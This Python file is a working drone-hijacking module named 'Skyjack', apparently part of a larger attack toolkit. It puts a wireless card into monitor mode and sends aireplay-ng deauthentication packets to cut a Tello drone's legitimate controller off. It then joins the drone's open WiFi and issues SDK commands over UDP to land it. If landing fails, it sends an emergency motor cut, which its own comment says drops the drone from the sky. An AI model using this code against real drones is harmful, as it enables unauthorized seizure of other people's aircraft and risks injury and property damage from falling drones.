# Deauthenticates a drone connection and takes control
# Sends a land command to safely ground the hijacked drone

import os
import json
import time
import socket
from src.utils import sudo_exec

##################
### PREP MODULE ##
##################

class Skyjack:
    def __init__(self):
        # Get path to project root directory (two levels up from this file)
        target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
        
        # Initialize target drone data
        with open(target_data_file, 'r') as file:
            scan_info = json.load(file)

        target_info = scan_info.get("target_info", {})
        self.target_name = scan_info.get("target_name", "Unknown")
        self.target_mac = target_info.get("mac_address")
        self.target_channel = target_info.get("channel")

        options_info = scan_info.get("options", {})
        self.deauth_packets = options_info.get("packets", 30)
        self.interface = options_info.get("interface", "wlan0")

        # TELLO drone constants
        self.tello_ip = "192.168.10.1"
        self.tello_port = 8889  # Command port
        self.local_port = 9000  # Local port to bind

        # Connection state
        self.sock = None
        self.connected = False

    def deauth_drone(self) -> bool:
        """
        Deauthenticates the current controller from the TELLO drone.
        Uses aireplay-ng to send deauthentication packets.
        
        Returns: True if deauth was successful, False otherwise.
        """
        print(f"\n[DEAUTH] Starting deauthentication attack on {self.target_name}")
        print(f"[DEAUTH] Target MAC: {self.target_mac}")
        print(f"[DEAUTH] Channel: {self.target_channel}")
        print(f"[DEAUTH] Packets: {self.deauth_packets}")

        try:
            # Put interface in monitor mode
            print(f"\n[DEAUTH] Setting {self.interface} to monitor mode...")
            sudo_exec(f"ip link set {self.interface} down")
            sudo_exec(f"iw {self.interface} set monitor none")
            sudo_exec(f"ip link set {self.interface} up")

            # Set to target channel
            print(f"[DEAUTH] Switching to channel {self.target_channel}...")
            sudo_exec(f"iw {self.interface} set channel {self.target_channel}")

            # Send deauth packets
            # -0 : Deauthentication attack
            # --deauth-count : Number of deauth frames to send
            # -a : Target access point MAC (the drone)
            print(f"[DEAUTH] Sending {self.deauth_packets} deauth packets...")
            sudo_exec(f"aireplay-ng -0 {self.deauth_packets} -a {self.target_mac} {self.interface}")

            print("[DEAUTH] Deauthentication complete!")
            return True

        except Exception as e:
            print(f"[DEAUTH] Error during deauthentication: {e}")
            return False

    def connect_to_drone(self) -> bool:
        """
        Switches interface to managed mode and connects to the TELLO drone's WiFi.
        TELLO drones broadcast an open WiFi network named 'TELLO-XXXXXX'.
        
        Returns: True if connection was successful, False otherwise.
        """
        print(f"\n[CONNECT] Connecting to drone {self.target_name}...")

        try:
            # Switch interface back to managed mode
            print(f"[CONNECT] Setting {self.interface} to managed mode...")
            sudo_exec(f"ip link set {self.interface} down")
            sudo_exec(f"iw {self.interface} set type managed")
            sudo_exec(f"ip link set {self.interface} up")

            # Wait for interface to come up
            time.sleep(1)

            # Connect to TELLO's WiFi network
            # TELLO drones have open networks (no password)
            print(f"[CONNECT] Connecting to TELLO WiFi: {self.target_name}...")
            sudo_exec(f"iw {self.interface} connect {self.target_name}")

            # Wait for connection
            time.sleep(2)

            # Get IP address via DHCP
            print(f"[CONNECT] Requesting IP address via DHCP...")
            sudo_exec(f"dhclient -v {self.interface}")

            # Wait for DHCP
            time.sleep(2)

            print("[CONNECT] WiFi connection established!")
            return True

        except Exception as e:
            print(f"[CONNECT] Error connecting to drone: {e}")
            return False

    def init_tello_sdk(self) -> bool:
        """
        Initializes UDP socket and puts TELLO into SDK mode.
        TELLO requires the 'command' message to enter SDK mode before accepting commands.
        
        Returns: True if SDK mode was enabled, False otherwise.
        """
        print(f"\n[SDK] Initializing TELLO SDK connection...")

        try:
            # Create UDP socket
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.bind(('', self.local_port))
            self.sock.settimeout(5.0)  # 5 second timeout

            print(f"[SDK] Socket bound to local port {self.local_port}")
            print(f"[SDK] Target: {self.tello_ip}:{self.tello_port}")

            # Send 'command' to enter SDK mode
            print("[SDK] Sending 'command' to enter SDK mode...")
            response = self._send_command("command")

            if response and response.lower() == "ok":
                print("[SDK] TELLO SDK mode enabled!")
                self.connected = True
                return True
            else:
                print(f"[SDK] Unexpected response: {response}")
                return False

        except socket.timeout:
            print("[SDK] Timeout waiting for response. Drone may not be reachable.")
            return False
        except Exception as e:
            print(f"[SDK] Error initializing SDK: {e}")
            return False

    def _send_command(self, command: str) -> str | None:
        """
        Sends a command to the TELLO drone and waits for response.
        
        Args:
            command: The SDK command to send (e.g., 'command', 'takeoff', 'land')
            
        Returns: Response string from drone, or None on error.
        """
        if self.sock is None:
            print("[CMD] Error: Socket not initialized")
            return None

        try:
            # Send command
            message = command.encode('utf-8')
            self.sock.sendto(message, (self.tello_ip, self.tello_port))
            print(f"[CMD] Sent: {command}")

            # Wait for response
            response, _ = self.sock.recvfrom(1024)
            response_str = response.decode('utf-8').strip()
            print(f"[CMD] Received: {response_str}")

            return response_str

        except socket.timeout:
            print(f"[CMD] Timeout waiting for response to '{command}'")
            return None
        except Exception as e:
            print(f"[CMD] Error sending command: {e}")
            return None

    def land_drone(self) -> bool:
        """
        Sends the land command to safely ground the drone.
        
        Returns: True if land command was acknowledged, False otherwise.
        """
        print("\n[LAND] Sending land command...")

        if not self.connected:
            print("[LAND] Error: Not connected to drone SDK")
            return False

        response = self._send_command("land")

        if response and response.lower() == "ok":
            print("[LAND] Drone is landing!")
            return True
        else:
            print(f"[LAND] Land command failed: {response}")
            return False

    def emergency_stop(self) -> bool:
        """
        Sends emergency stop command to immediately cut motors.
        WARNING: Drone will fall from the sky!
        
        Returns: True if emergency stop was acknowledged, False otherwise.
        """
        print("\n[EMERGENCY] Sending emergency stop!")

        if not self.connected:
            print("[EMERGENCY] Error: Not connected to drone SDK")
            return False

        response = self._send_command("emergency")

        if response and response.lower() == "ok":
            print("[EMERGENCY] Motors stopped!")
            return True
        else:
            print(f"[EMERGENCY] Emergency stop failed: {response}")
            return False

    def get_battery(self) -> int:
        """
        Queries the drone's battery level.
        
        Returns: Battery percentage (0-100), or -1 on error.
        """
        if not self.connected:
            return -1

        response = self._send_command("battery?")

        if response is None:
            return -1

        try:
            return int(response)
        except (ValueError, TypeError):
            return -1

    def cleanup(self):
        """
        Closes socket and cleans up resources.
        """
        if self.sock:
            self.sock.close()
            self.sock = None
        self.connected = False
        print("\n[CLEANUP] Connection closed.")


##################
## START MODULE ##
##################

if __name__ == "__main__":
    skyjack = Skyjack()

    print("=" * 60)
    print("  TELLO SKYJACK - Drone Hijacking Module")
    print("=" * 60)

    # Step 1: Deauthenticate the current controller
    print("\n[STEP 1] Deauthenticating current controller...")
    if not skyjack.deauth_drone():
        print("[ABORT] Deauthentication failed. Exiting.")
        exit(1)

    # Brief pause to let deauth take effect
    print("\n[WAIT] Waiting for controller to disconnect...")
    time.sleep(3)

    # Step 2: Connect to the drone's WiFi
    print("\n[STEP 2] Connecting to drone WiFi...")
    if not skyjack.connect_to_drone():
        print("[ABORT] Failed to connect to drone WiFi. Exiting.")
        exit(1)

    # Step 3: Initialize SDK mode
    print("\n[STEP 3] Initializing TELLO SDK...")
    if not skyjack.init_tello_sdk():
        print("[ABORT] Failed to enter SDK mode. Exiting.")
        skyjack.cleanup()
        exit(1)

    # Step 4: Get battery status
    print("\n[STEP 4] Checking drone status...")
    battery = skyjack.get_battery()
    if battery >= 0:
        print(f"[STATUS] Battery: {battery}%")

    # Step 5: Land the drone
    print("\n[STEP 5] Landing the drone...")
    if skyjack.land_drone():
        print("\n[SUCCESS] Drone has been safely landed!")
    else:
        print("\n[WARNING] Land command may have failed. Trying emergency stop...")
        skyjack.emergency_stop()

    # Cleanup
    skyjack.cleanup()

    print("\n" + "=" * 60)
    print("  SKYJACK COMPLETE")
    print("=" * 60)


